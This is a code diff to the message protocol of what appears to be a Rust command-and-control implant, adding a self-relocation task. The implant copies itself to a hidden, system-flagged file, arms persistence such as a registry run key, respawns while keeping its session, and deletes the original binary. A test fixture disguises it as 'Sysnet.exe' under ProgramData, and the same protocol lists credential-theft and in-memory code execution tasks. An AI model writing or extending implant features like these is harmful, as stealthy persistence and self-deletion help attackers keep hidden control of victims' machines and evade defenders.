@@ -50,6 +50,12 @@ pub mod task_kind {
     pub const CRED: u8 = 0x0E;
     /// In-process COFF object execution (ABR-T034).
     pub const EXECBOF: u8 = 0x0F;
+    /// Self-install relocation (ABR-T040): copy the running image to a
+    /// durable home, optionally arm a persistence mechanism against the
+    /// new copy, optionally respawn from there (session token carried
+    /// through the environment so the server RESUMES the same session)
+    /// and delete the staging binary.
+    pub const RELOCATE: u8 = 0x10;
 }
 
 /// Sub-actions of the CRED task kind (ABR-T032/T033).
@@ -247,6 +253,18 @@ pub enum TaskBody {
     ExecBof {
         data: Vec<u8>,
         args: Vec<u8>,
+    },
+    /// Self-install relocation (ABR-T040): copy the running image to
+    /// `dir` as `name` (hidden+system attributes), optionally install a
+    /// `persist` mechanism pointing at the new copy, and when `respawn`
+    /// is set, start the copy (resume token + old path through the
+    /// environment), report, exit — the respawned beacon deletes the
+    /// staging binary on its first successful link.
+    Relocate {
+        dir: String,
+        name: String,
+        persist: String,
+        respawn: u8,
     },
     Exit,
 }
@@ -509,6 +527,18 @@ impl Message {
                         put_blob(&mut buf, data);
                         put_blob(&mut buf, args);
                     }
+                    TaskBody::Relocate {
+                        dir,
+                        name,
+                        persist,
+                        respawn,
+                    } => {
+                        put_u8(&mut buf, task_kind::RELOCATE);
+                        put_str(&mut buf, dir);
+                        put_str(&mut buf, name);
+                        put_str(&mut buf, persist);
+                        put_u8(&mut buf, *respawn);
+                    }
                     TaskBody::ExecuteAssembly {
                         data,
                         type_name,
@@ -639,6 +669,12 @@ impl Message {
                         data: r.blob()?,
                         args: r.blob()?,
                     },
+                    task_kind::RELOCATE => TaskBody::Relocate {
+                        dir: r.string()?,
+                        name: r.string()?,
+                        persist: r.string()?,
+                        respawn: r.u8()?,
+                    },
                     task_kind::EXECASM => TaskBody::ExecuteAssembly {
                         data: r.blob()?,
                         type_name: r.string()?,
@@ -756,6 +792,15 @@ mod tests {
             id: 7,
             body: TaskBody::Shell {
                 command: "whoami".into(),
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 77,
+            body: TaskBody::Relocate {
+                dir: "C:\\ProgramData\\Sysnet".into(),
+                name: "Sysnet.exe".into(),
+                persist: "run-key".into(),
+                respawn: 1,
             },
         }));
         roundtrip(Message::Task(Task {
